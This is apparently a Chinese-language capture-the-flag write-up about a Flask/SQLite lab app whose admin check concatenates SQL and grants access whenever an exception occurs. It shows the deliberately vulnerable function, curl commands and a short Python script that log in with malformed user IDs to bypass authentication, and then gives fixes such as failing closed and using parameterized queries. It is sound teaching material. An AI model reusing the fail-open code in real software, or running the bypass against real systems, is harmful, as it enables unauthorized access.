# A10-ExceptionHandling Medium - WriteUP

## 题目分析

本题是一个Flask + SQLite用户管理系统，核心漏洞在于**异常处理不当导致的安全状态不一致**，具体表现为**"失败开放"（Fail Open）**设计缺陷。

### 什么是"失败开放"？

在安全系统中，有两种失败模式：
- **Fail Closed（失败关闭）**：当安全机制发生故障或异常时，默认拒绝访问。这是安全的设计。
- **Fail Open（失败开放）**：当安全机制发生故障或异常时，默认允许访问。这是危险的设计。

本题中的认证检查函数 `check_admin()` 采用了Fail Open模式：

```python
def check_admin(user_id):
    try:
        db = get_db()
        query = f"SELECT role FROM users WHERE id = {user_id}"
        cursor = db.execute(query)
        row = cursor.fetchone()
        if row is None:
            return False
        return row['role'] == 'admin'
    except Exception as e:
        # ❌ 任何异常都返回True！
        return True
```

### 为什么会触发异常？

`user_id` 从session中读取，本质是字符串。当传入非整数类型的 `user_id` 时，SQL拼接会产生语法错误：

- `user_id = 'abc'` → `SELECT role FROM users WHERE id = abc` → SQLite语法错误
- `user_id = "1 OR 1=1"` → 同样可能产生语法错误
- `user_id = "' OR '1'='1"` → SQL注入相关异常

### 漏洞点

1. **异常被吞噬**：`except Exception` 捕获了所有异常，包括数据库错误、类型错误等
2. **安全决策在异常处理器中做出**：异常处理器没有进行安全默认处理，反而授予了权限
3. **没有日志审计**：虽然有logger.warning，但攻击者已经成功绕过认证

## 解题步骤

### 第一步：观察系统

访问首页，发现有一个登录功能和API查询功能：

```bash
curl "http://target/"
```

### 第二步：正常流程测试

```bash
# 以访客登录（ID=2）
curl -c cookies.txt "http://target/login?user_id=2"

# 尝试访问flag（应该失败）
curl -b cookies.txt "http://target/admin/flag"
# 返回：权限不足
```

### 第三步：触发异常绕过认证

关键在于 `user_id` 参数。如果我们传入一个非整数值，SQL查询会抛出异常，导致 `check_admin()` 返回 `True`。

```bash
# 使用非整数的user_id登录
curl -c cookies.txt "http://target/login?user_id=abc"

# 访问flag
# 此时check_admin('abc')会执行 SELECT role FROM users WHERE id = abc
# SQLite不认识 abc（无引号），抛出 OperationalError
# except Exception 捕获后返回 True
curl -b cookies.txt "http://target/admin/flag"
```

其他可以触发的异常输入：

```bash
# 空字符串
curl -c cookies.txt "http://target/login?user_id="

# 特殊字符
curl -c cookies.txt "http://target/login?user_id='"
curl -c cookies.txt "http://target/login?user_id=1.5.6"
curl -c cookies.txt "http://target/login?user_id=true"
```

### 第四步：获取flag

成功的请求会返回包含flag的管理员页面：

```html
<h1>Admin Control Panel</h1>
<p>Welcome, admin!</p>
<p>FLAG: flag{...}</p>
```

## 完整自动化脚本

```python
#!/usr/bin/env python3
"""A10 Medium - Fail Open Exploit"""
import requests
import re

TARGET = "http://localhost:8081"

session = requests.Session()

# Step 1: 使用非整数user_id触发异常
print("[*] 使用异常输入登录...")
r = session.get(f"{TARGET}/login?user_id=abc")
print(f"[+] 登录响应: {r.status_code}")

# Step 2: 访问admin/flag
print("[*] 尝试访问flag...")
r = session.get(f"{TARGET}/admin/flag")
print(f"[+] 响应状态: {r.status_code}")
print(f"[+] 响应内容:\n{r.text}")

# 提取flag
flag = re.search(r'flag\{[^}]+\}', r.text)
if flag:
    print(f"\n[+] FLAG: {flag.group(0)}")
else:
    print("[-] 未找到flag")
```

## 进阶：通过API理解系统

```bash
# 查询正常用户
curl "http://target/api/user?id=1"
# {"id": 1, "username": "admin", "role": "admin"}

curl "http://target/api/user?id=2"
# {"id": 2, "username": "guest", "role": "user"}

# 异常输入导致错误
curl "http://target/api/user?id=abc"
# {"error": "no such column: abc"}
```

这说明当传入 `abc` 时，SQLite尝试将 `abc` 解释为列名而非字符串，从而抛出异常。

## 修复建议

### 1. 采用"失败关闭"原则

```python
def check_admin(user_id):
    try:
        db = get_db()
        # 使用参数化查询
        cursor = db.execute("SELECT role FROM users WHERE id = ?", (user_id,))
        row = cursor.fetchone()
        if row is None:
            return False
        return row['role'] == 'admin'
    except Exception as e:
        # ✅ 安全默认：异常时拒绝访问
        app.logger.error(f"Admin check error: {e}")
        return False
```

### 2. 使用参数化查询防止SQL注入和类型错误

```python
# 永远不要直接拼接SQL
cursor = db.execute("SELECT role FROM users WHERE id = ?", (user_id,))
```

### 3. 输入校验

```python
def check_admin(user_id):
    try:
        user_id = int(user_id)
    except (ValueError, TypeError):
        return False
    # ... 继续查询
```

### 4. 分离异常处理与安全决策

```python
def check_admin(user_id):
    role = None
    try:
        role = query_user_role(user_id)
    except Exception as e:
        app.logger.error(f"Query failed: {e}")
    
    # 安全决策不依赖于是否发生异常
    return role == 'admin'
```

### 5. 增加安全审计日志

所有认证失败和异常都应该被记录到安全日志中，便于事后审计。

## 相关OWASP链接

- [OWASP Top 10 2025 - A10: Mishandling of Exceptional Conditions](https://owasp.org/Top10/A10_2025-Mishandling_of_Exceptional_Conditions/)
- [CWE-636: Not Failing Securely ('Failing Open')](https://cwe.mitre.org/data/definitions/636.html)
- [CWE-754: Improper Check for Unusual or Exceptional Conditions](https://cwe.mitre.org/data/definitions/754.html)
